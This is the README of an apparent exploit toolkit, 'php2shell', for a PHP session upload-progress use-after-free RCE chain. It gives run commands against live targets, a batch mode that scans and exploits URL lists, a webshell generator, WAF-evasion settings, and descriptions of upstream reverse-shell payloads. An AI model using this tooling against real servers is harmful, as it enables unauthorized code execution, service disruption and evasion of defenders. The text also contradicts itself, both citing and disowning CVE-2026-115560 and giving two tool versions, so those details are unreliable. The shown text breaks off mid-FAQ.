<div align="center">

<img src="gambar/screenshot_1.png" alt="php2shell in action" width="720">

# 💀 P H P 2 S H E L L

### Unauthenticated RCE chain for PHP 5.4 → 8.4.26

*Pure HTTP · zero target-side requirements · JA3 fingerprint impersonation · proof-of-access design*

[![PHP](https://img.shields.io/badge/PHP-5.4%20→%208.4.26-777BB4?style=flat-square&logo=php&logoColor=white)](https://www.php.net)
[![CVSS](https://img.shields.io/badge/CVSS%204.0-9.2%20Critical-cb2431?style=flat-square)](https://www.first.org/cvss/)
[![Tests](https://img.shields.io/badge/tests-133-brightgreen?style=flat-square)](#-verification)
[![Platform](https://img.shields.io/badge/platform-Linux-blue?style=flat-square&logo=linux&logoColor=white)](#-the-5-lab-requirements)
[![License: GPL‑3.0](https://img.shields.io/badge/license-GPL--3.0-informational?style=flat-square)](LICENSE)
[![Docker](https://img.shields.io/badge/lab-docker%20one--command-2496ED?style=flat-square&logo=docker&logoColor=white)](#-one-command-lab)
[![Landing Page](https://img.shields.io/badge/landing%20page-docs%2Findex.html-00ff88?style=flat-square)](docs/index.html)

[Landing Page](docs/index.html) · [Install](#-install) · [Quick start](#-quick-start) · [Lab vs Live](#-lab-target-vs-live-target--read-this-before-running) · [Modes](#-modes) · [Repo sources](#-repo-sources--not-a-fork-but-a-derivative-of-several-repos) · [Research credits](#research-credits--who-found-it-who-wrote-it-down) · [How it works](#-how-it-works) · [Stealth](#-stealth--anti-bot-detection) · [FAQ](#-faq) · [Disclaimer](#-disclaimer--authorized-use-only)

</div>

> 🌐 **Landing Page & Web UI**: an interactive documentation page and simulation are available at [`docs/index.html`](docs/index.html). This static page can be served locally with `python3 -m http.server` inside the `docs/` folder.

---

## ❖ What is this?

`php2shell` is a **reproduction and research toolkit** for two critical PHP
vulnerabilities — **CVE-2026-109619** and **CVE-2026-109618** (CVSS 4.0 **9.2
Critical**, unauthenticated, fixed in `8.2.35 / 8.3.36 / 8.4.27 / 8.5.12`).

It turns the bug into a **fully remote, HTTP-only exploit chain** against
`mod_php + Apache prefork` with **zero target-side requirements**:

- ❌ no `session_start()` needed on the target page
- ❌ no file upload feature needed
- ❌ no credentials, no cookie, no header trick
- ✅ the target page can be literally `<?php echo "OK\n"; ?>`

The toolkit is **proof-of-access by design**: commands are capped at 14 bytes,
limited to identity commands (`id`, `whoami`, …), `bash`/`nc`/`curl` are permanently
blocked, and evidence is retrieved automatically — it demonstrates impact
**without** being a drop-in backdoor.

---

## ❖ The bugs

| | CVE-2026-109619 | CVE-2026-109618 |
|---|---|---|
| **Class** | stale global state → UAF | OOM bailout corruption → longjmp |
| **Trigger** | `session.upload_progress` multipart callbacks run **before RINIT**; OOM leaves `PS(http_session_vars)` / `PS(id)` dangling → the next request on the **same worker** calls `zval_ptr_dtor` on freed memory | `zend_bailout()` mid-allocation leaves half-built structures in global state |
| **Requests** | 2 (producer + consumer) | 1 |
| **Fix** | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 | same |
| **Status in this toolkit** | ✅ **implemented — full 0→RCE chain** | ⛔ intentionally not implemented (detect/preflight only) |

**Version semantics** — if your PHP is **below** the fix-floor, it is **vulnerable
and exploitable**; every release **from the fix-floor up** patches all of these
issues. PHP ≤ 8.1 is EOL: no backports, vulnerable forever.

| Branch | last vulnerable | fixed |
|---|---|---|
| 8.2 | 8.2.34 | 8.2.35 |
| 8.3 | 8.3.35 | 8.3.36 |
| 8.4 | **8.4.26** | **8.4.27** |
| 8.5 | 8.5.11 | 8.5.12 |
| ≤ 8.1 | all (EOL) | never |

Highest impact: **mod_php + prefork** (cross-request worker reuse).
php-fpm is a strong mitigation (the worker dies per request).
CDN-hidden versions? **Detection is information, not a gate** — preflight
reports what it can see and the chain proceeds anyway.

### Post-release advisory (verified 2026-10-24, primary sources)

- **The patches were rebuilt on 22 Oct 2026** — `8.5.12` and `8.4.27` carry
  ChangeLog entries dated 22 Oct (`Avoid state corruption via bailout`), but the
  version numbers did not change. The same `8.4.27` can mean the 21 Oct build
  (not final) or the 22 Oct build (final). **Check the package build date, not
  just the version string.**
- **A third CVE exists: `CVE-2026-115560`** (`Session upload progress`).
  Reserved, full advisory to follow in a regular release. It needs
  `session.serialize_handler` set to `php_binary`/`php_serialize` and switched
  to `php` at runtime via `ini_set()` before `session_start()`, plus
  `session.upload_progress.enabled=On`. Mitigate with
  `session.upload_progress.enabled=0`. **NOT closed by the fix-floor below —
  see the callout right after this list.**

> **CVE-2026-115560 (2026-10-23, not yet patched):** the fix-floor above does
> **not** close the session serialize_handler mismatch bug (object injection via
> app-side `ini_set`). `patched` + `upload_progress=On` ≠ safe — detect
> prints this caveat automatically. Details: `docs/CVE-2026-115560.md`.
- **`memory_limit=-1` is NOT a complete mitigation** (GHSA-w8hw-w9fx-j79w).
  If a base allocation fails, `longjmp()` can still happen while request memory
  is reachable. Only upgrading is complete.
- **`session.upload_progress.enabled=0` only closes 109618 (+115560). It does
  not close 109619.**
- **In-the-wild exploitation predates the patch:** first attempts 17 Oct 2026,
  four days before release, from anonymized/VPN IPs against honeypots
  (Amazon Threat Intelligence). No confirmed successful compromise is public
  as of 2026-10-23.

Run `php2shell version --advisories` for this list from the CLI.

---

## ❖ Install

```bash
git clone https://github.com/aarsaputra/php2shell.git
cd php2shell
bash install.sh        # venv + deps + smoke-tests + global `php2shell` command
```

<details>
<summary>Manual install (no installer)</summary>

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt     # curl_cffi (JA3) + bcrypt (webshell mode)
python php2shell.py --help
```

</details>

Every dependency and why it exists: **[REQUIREMENTS.md](REQUIREMENTS.md)**.

---

## ❖ One-command lab

The repo ships the **author's exact vulnerable lab configuration** — reproducing
the research environment is one command, not an afternoon:

```bash
bash lab/lab_docker.sh start
# → pulls official php:8.4.26-apache
# → mounts docker/php.ini + docker/apache.conf + docker/www (author's config)
# → single prefork worker, KeepAlive Off, upload_progress tuned
# → http://127.0.0.1:8095/index.php
```

---

## ❖ Quick start

```bash
# 0) fresh binary offsets (required after every image change)
python3 docker/offsets.py          # → out/offsets.env

# 1) run the chain with automatic proof retrieval
php2shell exploit \
    -u http://127.0.0.1:8095/index.php --force --yes \
    --exploit-profile bookworm -c 'id>/out/p1'
```

```text
 ____  _   _ ____ ____  ____  _   _ _____ _     _
|  _ \| | | |  _ \___ \/ ___|| | | | ____| |   | |
| |_) | |_| | |_) |__) \___ \| |_| |  _| | |   | |
|  __/|  _  |  __// __/ ___) |  _  | |___| |___| |___
|_|   |_| |_|_|  |_____|____/|_| |_|_____|_____|_____|
  P H P 2 S H E L L  v1.3.0  -  integrated toolkit
  ----------------------------------------------------------------
  tested: CVE-2026-109619 (full chain)   detected: CVE-2026-109618 (different chain, not executed)
  fix-floor: 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12
  last vulnerable: 8.2.34 / 8.3.35 / 8.4.26 / 8.5.11
  ----------------------------------------------------------------
  stealth: curl_cffi JA3 impersonate
  ----------------------------------------------------------------

  mode       : scan  |  detect  |  preflight  |  exploit  |  shell  |  version
  quick      : php2shell.py scan -l targets.txt
  help       : php2shell.py --help

  fences & warnings: php2shell.py --help  |  details: README.md
```

*(exactly the banner the CLI prints when run — source: `lib/banner.py`)*

---

## ❖ Lab target vs Live target — read this before running

Two different scenarios, and **the commands differ**:

### A) Local lab (`127.0.0.1`) — full proof

```bash
php2shell exploit -u http://127.0.0.1:8095/index.php --force --yes \
    --exploit-profile bookworm -c 'id>/out/p1'
# → PROOF (8.3s): uid=33(www-data)   ← command output READ back automatically
```

Why is it readable? `id>/out/p1` writes the output of `id` to the file `/out/p1`
inside the container, and that folder **is mounted onto the host** (`out/p1`). The
toolkit reads it automatically → you see `uid=33(www-data)` in your terminal.

### B) Live target (a real website) — blind by design

```bash
php2shell exploit -u https://target.example/ --yes -c 'id'
# → stages 1/2/3 completed, but:
# → BLIND — the command was sent, but there is no proof channel
```

On a live target **`id>/out/p1` is USELESS** — the `/out` folder on the target
server is not mounted onto your machine, so there is nothing to read. The result is
`BLIND`: the chain *is executed* (worker dies + restarts = a clear trace in the
server log), but the command output never reaches you.

**That is a design decision, not a shortcoming:** going to the trouble of building
an "output read channel" on a live target = building a data-exfiltration tool =
crossing the line from proof-of-access → backdoor. This toolkit deliberately stops
at proof of *execution* (worker crash pattern + stage 3 completion), not proof of
*command output*.

**The recommended workflow on a live target:**

```bash
# 1) RECON first — without touching exploit:
php2shell detect    -u https://target.example/
php2shell preflight -u https://target.example/
# verdict: vulnerable / patched / unknown (CDN) + readiness score

# 2) Check whether upload_progress & display_errors leak or not:
#    if the CDN withholds the version → you may still proceed (detection is not a gate)

# 3) Exploitation (if the target is YOURS / you have permission):
php2shell exploit -u https://target.example/ --yes -c 'id'
# BLIND result = executed but output not readable
# impact proof: worker crash in the server log + stage-3 completion
```

> ⚠️ **Be aware of the risk on a live target:** every attempt makes one Apache
> worker **die (SIGABRT)** and then get forked again. On a production server that
> means service disruption + an extremely obvious log trail + a possible WAF
> block. One attempt is enough to prove it — the 3×3 retry loop is for the lab only.

---

## ❖ Modes

### `scan -l targets.txt` — many targets at once

```bash
php2shell.py scan -l targets.txt                     # detect + preflight everything
php2shell.py scan -l targets.txt --exploit --yes     # + exploit only the ones READY
php2shell.py scan -l targets.txt --threads 10        # parallel
php2shell.py scan -l targets.txt --json out/r.json --csv out/r.csv
```

File format: one URL per line, `#` comments, duplicates dropped (case & trailing
slash are considered the same), lines without `://` get `https://` automatically.
Result: a terminal table + JSON + CSV (verdict, version, score, ready, proof).

### `detect -u URL` — peek at the version (read-only, does not attack)

```bash
php2shell.py detect -u https://target.example/
```

Reads: PHP version (header/X-Powered-By/error page), branch & fix-floor
verdict (vulnerable/patched/EOL), `session.upload_progress` status,
`display_errors` status. Its ammunition is an ordinary GET.

**Active OOM detection (new, v1.4.0)** — switches on automatically when the verdict
is still `unknown`/`eol` after the passive probe (the PHP version is hidden by a CDN
or the target is EOL). The methodology follows
[assetnote/php2shell-scanner](https://github.com/assetnote/php2shell-scanner):
a control request + three multipart probes with nested-62-level array keys
(1 → 8 → 20 MiB). Verdict `vulnerable` when any of the following appears:
- a fatal `Allowed memory size ... in Unknown` (OOM inside the multipart
  parser), or
- a differential empty HTTP 500 (the FPM worker dies mid-request), or
- 502/503/504 (the worker aborts behind the front end).

False-positive protection: the warning `POST Content-Length exceeds the
limit` (its location is also `Unknown`, but that is the post_max_size guard — not
the bug) is NOT counted as a signal.

```bash
php2shell.py detect -u https://target.example/          # OOM automatic (when unknown/eol)
php2shell.py detect -u https://target.example/ --no-oom  # turn the OOM probe off
```
Note: if the target's `memory_limit` is > 20 MiB, OOM is never reached →
the verdict stays `inconclusive` with an explicit reason (not "not
vulnerable"). Targets whose version is readable and >= fix-floor are never
OOM-probed (cheaper and leaves the smallest trace).

### `preflight -u URL` — readiness score + blockers

```bash
php2shell.py preflight -u https://target.example/
```
Score 0–90 from: vulnerable version (30), upload_progress On (30), display_errors
On (15), version recognised (15). **Philosophy: detection = information, not a gate** —
a version hidden by a CDN still proceeds; there are only 2 hard blockers: the server is
down, or the READ version is already patched.

### `exploit -u URL` — the full chain

```bash
# local lab (mount /out) → command output READ back:
php2shell.py exploit -u http://127.0.0.1:8095/index.php --force --yes \
    --exploit-profile bookworm -c 'id>/out/p1'

# live target → BLIND (command runs, output not readable — by design):
php2shell.py exploit -u https://target.example/ --yes -c 'id'
```
Important options:
| Flag | Function |
|---|---|
| `-c / --cmd` | proof command, max 14 bytes; default `id` |
| `--allow-cmd CMD` | add to the whitelist (ls/cat/df/uname/dll) — repeatable |
| `--exploit-profile {bookworm,lab}` | set the built-in offsets (bookworm = the official image) |
| `--zif-offset / --dtor-offset / --htdata-offset` | manual offsets for other builds |
| `--retries N` | retries per stage (default 3, heap-fresh via worker rotation) |
| `--huge-mb N` | force the size of the stage-1 OOM field (default: read from `memory_limit`) |
| `--force` | force past a NOT-READY preflight (confirmation still required) |
| `--exploit-timeout N` | total time limit for the chain (default 300s) |

#### Why `--huge-mb` is automatic now

Stage 1 sends a single multipart field that **must be larger** than the target's
`memory_limit` — that is what triggers the OOM. It used to be nailed to 12 MB,
and the consequence differed from target to target:

| target `memory_limit` | 12 MB hardcoded | now |
|---|---|---|
| 8 M | OOM, the chain runs | read 8 M → send 10 MB |
| 128 M | **no OOM**, the chain dies without a clear reason | read 128 M → send 147 MB |
| 512 M | **no OOM**, and 12 MB sent for nothing | stop + warning |

Failures in the second and third rows look identical from the outside ("stage1
failed"), even though the causes differ. Now `exploit` sends **one** probe
request first, reads the number out of the PHP fatal message
(`Allowed memory size of N bytes exhausted`), and then sets the field
slightly above the limit.

What this tool does **not** do: keep raising the size until it works.
If the number is unreadable (`display_errors=Off`), it uses the 12 MB default
and says so — it does not sweep 256 MB at someone's target just to
guess. If `memory_limit` is above 512 MB, it stops and reports,
because this chain really will not run there.

#### The target requirements that actually matter

The chain fails at stage 1 not because of the number of Apache workers, but because
**the request never reaches PHP intact**. If `post_max_size` is smaller
than the stage-1 body, PHP discards that body before the script runs — and
from the outside the failure is identical to "the target is not vulnerable".

| Setting | Requirement | Why |
|---|---|---|
| `post_max_size` | ≥ 64M | the stage-1 body is larger than `memory_limit`; if this is smaller, the body is thrown away outright |
| `upload_max_filesize` | ≥ 64M | the per-file limit for the multipart field |

`exploit` now distinguishes the two and stops within ~2 seconds with
the correct reason:

```
[*] 16 MB body rejected by the target before the script ran — post_max_size too small for stage-1
     failed (0.0s): the target rejected the stage-1 body before PHP ran the script ...
```

The popular claim "you need 150 workers, leave 1 spare" (from `9bie`) is **not proven**
on re-test: the chain runs with 1 worker as well as with 150 workers. The number 150
turns out to be just the stock `mpm_prefork.conf` default. The full experiment is in
[`docs/SYARAT_TARGET.md`](docs/SYARAT_TARGET.md).

```console
$ php2shell.py exploit -u http://target/index.php -c 'id>/out/p1'
[*] memory_limit 8 MiB read from the target; field 'big' set to 10 MB (must be > limit)
     stage 1: heap leak (attempt 1/3)
     PROOF (7.7s): uid=33(www-data) gid=33(www-data)
```

### `shell` — password-protected webshell generator

```bash
php2shell.py shell --out shell/out --ttl 72
```
Produces a PHP file (32-hex name) + `CREDENTIALS.txt` (bcrypt, NOT
stored inside the shell). Features: bcrypt password, per-shell command whitelist,
expiry TTL, rate limit. **Generator only — it does not upload.**
Local test: `php -l <file>` then `php -S 127.0.0.1:8099`.

### `version` — automatic version check

```bash
php2shell.py version                  # compare against the public release on GitHub
php2shell.py version --no-cache       # ignore the 1 hour cache
php2shell.py version --json out/v.json
php2shell.py detect -u https://t/ --check-version   # check first, then continue
```

Comparison sources (in order, fail-safe):

| Order | Source | Note |
|---|---|---|
| 1 | `releases/latest` | GitHub release tag (if a release already exists) |
| 2 | `/tags` | highest tag, sorted numerically (not lexically) |
| 3 | `VERSION` on branch `main` | fallback while the repo has no tag yet |

Behaviour:

- **Fail-safe**: offline, dead DNS, GitHub rate-limit, repo 404 → status
  `unknown` + a reason. It never crashes, it never fails the main mode.
- **Numeric semver**: `1.10` counts as newer than `1.2` (not a string compare).
- **1 hour cache** in `out/version-check.json` so GitHub rate-limits do not bite.
- **No telemetry**: only a GET to GitHub, no data is sent anywhere.
- **Exit code**: `0` = up to date / cannot check, `10` = an update exists (usable
  as a CI gate).

```
[OK]   local   : 1.3.0
      remote  : 1.3.0  (source: branch)
      status  : current
      message : php2shell 1.3.0 — already the latest version
      repo    : https://github.com/aarsaputra/php2shell
```

### `builds` — which builds can actually be RCE'd

This answers the question that is most often answered wrongly: **"can this target
be RCE'd or can it only be leaked?"** Before version 1.3.0, `preflight` returned
`READY` for any build that passed the version check — even though PHP 8.3.x is proven
to only reach the leak stage.

```bash
php2shell.py builds                 # the whole table
php2shell.py builds --level rce     # only the ones whose RCE is proven
php2shell.py builds --json out/b.json
```

```
  PHP       arch      support   notes
  8.5.11    amd64     RCE       separate offsets, same htdata
  8.5.11    aarch64   RCE       uid=33(www-data)
  8.5.10    aarch64   RCE       uid=33(www-data)
  8.4.26    amd64     RCE       our lab reference build; RCE proven here
  8.4.25    aarch64   RCE       stage 3 probabilistic — needs retries
  8.5.0     any       LEAK      stage-3 layout not found
  8.3.35    aarch64   LEAK      stage-3 reference alive, no RCE
  8.3.33    amd64     LEAK      wordpress:7.1.1-apache mod_php
  8.3.0     aarch64   NO        PS(id) dangling; cookie not reclaimed
  8.2.34    aarch64   NO        UAF exists; leak shape differs
  8.1.34    aarch64   NO        UAF exists; leak shape differs
  8.0.30    aarch64   NO        UAF exists; leak shape differs
  7.4.33    aarch64   NO        UAF exists; leak shape differs

  total 13 builds: 5 RCE, 3 leak-only, 5 unproven
```

Meaning of the `support` column:

| Value | Meaning | What happens during exploit |
|---|---|---|
| `RCE` | stages 1+2+3 proven on that exact build | the command really executes, `PROOF` appears |
| `LEAK` | stages 1+2 proven, stage 3 not | stops after the address leak; the command is **not** executed |
| `NO` | never proven to go further | probably stops at stage 1-2 |
| `?` | build not in the table | tried with the default offsets; consider it unproven |

This table also shows up automatically in `preflight` as the `support :` line and in
the 3rd column of the `scan`/`detect` table — so the decision to fire is made
**before** the chain runs, not after waiting 200 seconds for a failure.

Two things need to be stressed:

- **Architecture decides.** `8.4.26` is RCE on `amd64`, but only `LEAK` on
  `aarch64`. If the target architecture is unreadable, the tool uses the RCE
  entry as an estimate — with the caveat that architecture decides the outcome.
- **`NO` does not mean "impossible".** That is the word used by the author of the
  original table, and we follow it as-is. Offsets can be supplied manually via
  `--zif-offset` / `--dtor-offset`.
  If you have a build that is not in the table but its RCE works, that is a new
  finding — not an error in the table.

Table sources: `devploit/php2shell` (13 heap profiles, 5 verified RCE),
`9bie/php2shell-bypass-aslr-exp` (worker pinning on the stock image), and our own lab
(`php:8.4.26-apache`). No number here is invented.

### Global flags (apply to every mode)

| Flag | Function |
|---|---|
| `--ja3 {chrome,safari,firefox,edge,android}` | browser TLS+UA profile (default chrome) |
| `--delay N` | delay between requests + jitter (default 1.0s; jitter 0.75–1.35×) |
| `--timeout N` | HTTP timeout per request (default 15s) |
| `--proxy URL` | go through a proxy, e.g. `http://127.0.0.1:8080` |
| `--audit FILE` | log EVERY request to JSONL (evidence + troubleshooting) |
| `--no-upload-progress` | skip the upload_progress probe during detect |
| `--no-display-errors` | skip the display_errors probe during detect |
| `--json / --csv` | report file output |
| `-v, --verbose` | show every request (status, duration, body size, error) |

### Advanced flags (scan & exploit)

| Flag | Function |
|---|---|
| `--quiet` | shrink the chain output (the opposite of `-v`) |
| `--cve {CVE-2026-109619}` | pick the CVE to fire (109619 only; other values are rejected — 109618 is not implemented) |
| `--fetch URL` | URL fetched through the RCE after execution (a channel to read the result) |
| `--proof-file NAME` | does `-c 'id>/out/NAME'` and then reads the result back (name `[A-Za-z0-9_-]{1,24}`; the proof channel) |
| `--output-file FILE` | write the raw chain output to a file |
| `--offsets-file FILE` | use an offset profile from a file; `''` = do not use the lab profile |
| `--no-auto-offsets` | do not look for offsets automatically (force `--zif-offset`/`--dtor-offset`) |
| `--no-pre-rotate` | do not rotate the worker before preflight |
| `--no-retry-rotate` | do not rotate the worker on retry |

### `detect` / `preflight` mode flags

| Flag | Function |
|---|---|
| `-u, --urls URL [URL ...]` | one or more URLs directly |
| `-l, --list FILE` | or read a URL list from a `.txt` file |

### `shell` mode flags

| Flag | Function |
|---|---|
| `--out DIR` | webshell output folder (default `shell/`) |
| `--ttl HOURS` | webshell lifetime in hours (default 72) |
| `--commands "a,b,c"` | command whitelist inside the webshell (default `id,whoami`) |
| `--author NAME` | author signature in the webshell header |
| `--purpose TEXT` | purpose note in the webshell header |

---

## ❖ Repo sources — not a fork, but a derivative of several repos

This repo is **not a fork**. There is no single repo that could be forked to become
php2shell, because the material is taken from **four different sources** (three public
repos + two official advisories). That is why the sources are listed one by one
here, instead of through a "forked from" mechanism.

### Repos we took from

| # | Repo | Author | What was taken from it | License |
|---|---|---|---|---|
| 1 | `https://github.com/9bie/php2shell-bypass-aslr-exp` | **9bie (Qi Deng)** | **The core chain**: 2-request `session.upload_progress` UAF (CVE-2026-109619), ASLR bypass via heap + `libphp` base leak, actuator `pDestructor = zif_system`. `lib/chain.py` = a port of that logic into an in-process module. | no license file (default copyright) |
| 2 | `https://github.com/Zer061/CVE-2026-109618` | **Zer061** (+ v.dir.mir, 9bie) | The fork our byte-level `exploit.py` reference was taken from (sha256 `ea925683…`). Its history is mixed: `adc5f9b` by 9bie, `5fc5669` by v.dir.mir (**added `--revshell`**), `4752adc` by Zer061. **Already taken down by GitHub.** | no license file |
| 3 | `https://github.com/ikow/php2shell-poc` | **ikow** | The CVE-2026-109618 crash verifier (`poc/verify_oom_trigger.py`). | referenced, not vendored |
| 4 | `curl_cffi` — `https://github.com/lexiforest/curl_cffi` | lexiforest / yifeikong | JA3/TLS impersonation in `lib/transport.py`. | MIT (dependency) |

### Two comparison repos (read, not vendored)

We did **not** take code from these two repos — they were read for comparison, and one
of them contributed **data** that we adopted (the build support table).
They are named here so it is clear which part is code and which part is measurement.

| Repo | What we took | What we did NOT take |
|---|---|---|
| `https://github.com/devploit/php2shell` (devploit, MIT) | **The 13 heap profile table** → `lib/build_support.py`: which builds are RCE, which only leak, per architecture. This is their measurement, and they are credited in the module header. | Code. We also did **not** follow them in citing `CVE-2026-115560` — that number does not exist in MITRE/NVD/`php/php-src` advisory lists. |
| `https://github.com/murrez/php2shell` (murrez, MIT) | Nothing was adopted into the code. | Code. The 4,411-line `poc.py` is not vendored; we do not repeat their claim of `CVE-2026-115560` as the "headline". |

What is interesting about `devploit`, and what we noted in `ATTRIBUTION.md`: they
solved 9bie's licensing problem by **not** copying code at all —
`bootstrap_upstream.py` only clones a specific commit at runtime.
We could not take that route (the chain engine has to run offline), but
the pattern is right.

### Advisories & official data

| Source | What was taken |
|---|---|
| `GHSA-w8hw-w9fx-j79w` (PHP Group) | CVE-2026-109618 — OOM inside `session.upload_progress` |
| `GHSA-6wmf-4rv5-p3rp` (PHP Group) | CVE-2026-109619 — UAF in `php_session_initialize()` |
| php.net changelog 8.4.27 | fix-floor 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |

### Research credits — who found it, who wrote it down

This tool **does not claim discovery of the CVEs**. The discoverer is **Wiz
Research**, and that has to be said before the names of the people who wrote the
code.

| Name | Role |
|---|---|
| **Wiz Research** | Discoverer and public analyst of PHP2Shell (CVE-2026-109618 / CVE-2026-109619) — [blog](https://www.wiz.io/blog/php2shell-php-rce). Everything in this repo starts from that publication. |
| **Calif** | Parallel research, analysis of upload metadata amplification ([calif.io](https://calif.io/research/wp2root)). |
| **9bie (Qi Deng)** | First public exploit + heap grooming research: stage-1/2 leak, stage-3 fake HashTable carrier. The chain in `lib/chain.py` is a port of that logic. |
| **Karasawa2025** | The `display_errors=Off` direction — the OOM-in-cookie primitive and an alternative leak strategy. |
| **v.dir.mir** | Added `--revshell` to the reference `exploit.py` (commit `5fc5669`). That feature was **not** ported here. |
| **Zer061** | The fork our byte-level `exploit.py` reference was taken from (sha256 `ea925683…`). |
| **ikow** | OOM verifier for CVE-2026-109618 (`poc/verify_oom_trigger.py`). |
| **devploit** | The 13 heap profile table → `lib/build_support.py`, and the `bootstrap_upstream.py` licensing pattern. |
| **Assetnote / Searchlight Cyber** (Shubham Shah, Adam Kues, Patrik Grobshäuser) | The active detection methodology in [`assetnote/php2shell-scanner`](https://github.com/assetnote/php2shell-scanner) + the [Searchlight write-up](https://www.slcyber.io/research/high-fidelity-detection-mechanism-for-php2shell-cve-2026-109618-and-cve-2026-109619): staged 1/8/20 MiB OOM probes with nested-62 keys, the `fatal-in-parser`/`empty-500-differential`/`worker-abort` signals, and catching the `memory_limit` false-positive → adopted as `lib/oomprobe.py` (automatic in `detect` mode; `--no-oom` to disable). |
| **calif.io** | The [original php2shell write-up](https://calif.io/php2shell/), the first to detail the exploitation conditions of mod_php & php-fpm — referenced by the assetnote scanner as a triage basis. |
| **PHP Group** | Advisories + the fixes in 8.4.27 / 8.5.12. |

If a credit is missing or wrong, open an issue — that is devploit's sentence,
and we use it too because that is exactly how it should be.

Deliberately **not** cited: `WoYinDao` (mentioned by devploit, but we found no
public trace we could verify) and `CVE-2026-115560` (404 at MITRE,
0 results at NVD) — that number is used by `murrez` as a headline, and we do not
repeat it.

### Why it cannot be forked

A fork = a single git lineage. Here:

- the exploit chain comes from **9bie** (repo 1), but the build of `exploit.py`
  was taken from **Zer061's fork** (repo 2), whose own history is a mix of
  three authors;
- the vulnerability verification for CVE-2026-109618 comes from **ikow** (repo 3);
- the version semantics & fix-floor come from the **PHP Group advisories** (not a repo);

None of them can be the single "parent". What we wrote
ourselves: the 7-mode CLI, the in-process engine `lib/chain.py`, auto-proof reading of `out/p1`,
the command fence, the preflight score, stealth mode, 133 unit tests, the installer, the Docker lab.

### Why `--revshell` is not here

Our reference `exploit.py` (sha256 `ea925683…`, from repo 2) **contains a reverse
shell** added by commit `5fc5669` by **v.dir.mir**:

- a `bash` payload via `/dev/tcp/{ip}/{port}`
- a `python3` pty spawn payload
- a `perl` socket exec payload
- an `nc` listener that hands over an interactive shell

This is a documented feature, **not a hidden trojan** — but it is also the legitimate
reason GitHub took down the originating repo. We did not adopt it:

| Upstream | php2shell |
|---|---|
| `--revshell IP:PORT` | **not registered in argparse** |
| `bash`/`python`/`perl` payloads | cannot be sent (14 byte cap + whitelist) |
| `sh</out/c` | `<` and `>` are rejected as operators |
| `nc` listener | **not implemented** |

### Forensic audit result — the ENTIRE git history (2026-10-24)

Not just the working tree: **all 384 blobs from 19 commits** were extracted and
scanned. Full report: `AUDIT_FORENSIK_Zer061_2026-10-24.md` (lab SSD).

| Check | Result |
|---|---|
| C2 / hardcoded external hosts | **none** — only `hub.docker.com` in the README, `127.0.0.1`, `localhost` |
| Credential theft (`~/.ssh`, `.aws`, `/etc/shadow`, `.netrc`) | **none** |
| Persistence (`crontab`, `systemd`, `rc.local`, autostart) | **none** |
| Obfuscation (`b64decode`, hex blob, `chr()` chain, keylogger) | **none** — `\x..` = the protocol byte array |
| Unknown binaries | **none** — only the official `php-8.4.26.tar.gz` + 1 PNG |
| `scp` to an outside host | **none** — only `172.16.1.112` (RFC1918, the author's lab VM) |
| **`--revshell` + payloads + `nc` listener** | **PRESENT in the reference source** — **fully blocked here** |

The word "pristine" in older documents means **not modified by us**, not
**harmless**. If you fork this repo, **diff first before trusting** — the same
rule we applied to upstream.

---

## ❖ How it works

```text
┌──────────────┐   ① 12MB multipart → OOM inside
│   REQUEST A  │      php_session_initialize()
│  (producer)  │      → PS(http_session_vars) dangles
│              │      → Apache prefork worker dies (SIGABRT)
└──────────────┘
┌──────────────┐   ② prefork forks a fresh worker that INHERITS
│   REQUEST B  │      the same libphp mapping & heap layout
│ (consumer)   │      → re-occupies the dangling reference with
│              │      attacker-sized multipart buffers
└──────────────┘
       │
       ▼   ③ fake HashTable whose pDestructor = zif_system
┌──────────────────────────────────────────────┐
│  php_session_track_init()                    │
│    → zval_ptr_dtor(PS(http_session_vars))    │
│      → zend_reference_destroy(R0)            │
│        → zend_array_destroy(fake HT)         │
│          → zend_hash_destroy(fake HT)        │
│            → pDestructor(&bucket) = SYSTEM() │
└──────────────────────────────────────────────┘
```

**What leaks first:** a 4096-byte `Set-Cookie` header carried by an
out-of-bounds `php_url_encode()` read reveals the **Zend MM chunk base**;
a second stale read exposes `zval_ptr_dtor`'s address → **libphp base** →
ASLR defeated, all offsets resolved, command executed.

`--no-pre-rotate`, `--retries`, `--huge-mb`, `--zif-offset/--dtor-offset`
expose every tuning knob the chain has.

---

## ❖ Stealth / anti-bot detection

The requests it sends are deliberately made to **look like a real browser**, not a script:

| Layer | What it does |
|---|---|
| **TLS/JA3 fingerprint** | `curl_cffi` replays a real browser handshake (JA3 + ALPN + extensions exactly) — a standard Python script produces a strange JA3 that a WAF spots instantly; this one does not |
| **Complete browser profile** | `--ja3 chrome` (default), `safari`, `firefox`, `edge`, `android` — TLS + User-Agent + Accept-Language consistent as one identity |
| **Normal-looking headers** | `Accept`, `Accept-Encoding`, `Sec-Fetch-*`, `Upgrade-Insecure-Requests` — exactly a browser's order and contents, not `requests`/`urllib` defaults |
| **Identity rotation** | profiles rotate between requests → traffic from 1 IP is not always the same profile (like a real user on different devices) |
| **Human timing** | delay between requests + random jitter (0.75×–1.35×) — a perfectly regular robot cadence is easy to score |
| **Polite retries** | exponential backoff (2→4→8 seconds), not brute force |
| **Local audit trail** | every request is recorded in a JSONL file (`--audit`) — you can audit for yourself exactly what was sent |

```bash
# example: use the Safari identity + go through a proxy + 3 second delay between requests
php2shell exploit -u <url> --ja3 safari --proxy http://127.0.0.1:8080 --delay 3 --yes
```

**Its measurable limit:** this gets past classic *script-vs-browser* detection (JA3, headers, timing patterns). If the target uses heavy bot-management (Cloudflare Bot Management, Akamai) that inspects HTTP/2 frame order, cookie history, or even JS rendering — that is a different arms race and this tool does not claim to win there. For a PHP prefork lab & the majority of ordinary servers: safe enough. 😉

---

## ❖ The 5 lab requirements

Your run fails on a build/config that isn't calibrated. These are the knobs:

1. **`MaxRequestWorkers 1`** — producer & consumer must land on the *same* worker
2. **`KeepAlive Off`**
3. **fresh `out/offsets.env`** — stale offsets are the #1 silent killer
4. **`session.upload_progress.cleanup = On`**
5. **minimal endpoint** — `<?php echo "OK\n"; ?>`

Targets with a different build (distro PHP, other version): measure their
`libphp.so` and pass `--zif-offset / --dtor-offset`. Retrying with wrong
offsets never helps — `HEAP_LEAK_FAILED` means *not calibrated*, not *"safe"*.

---

## ❖ FAQ

<details>
<summary><b>Does it work against any PHP site?</b></summary>

No — and this is an honest limitation. It requires mod_php + Apache **prefork**,
the vulnerable version range, `session.upload_progress=On`, and heap conditions
matching a calibrated build. php-fpm largely mitigates this bug. That's what the
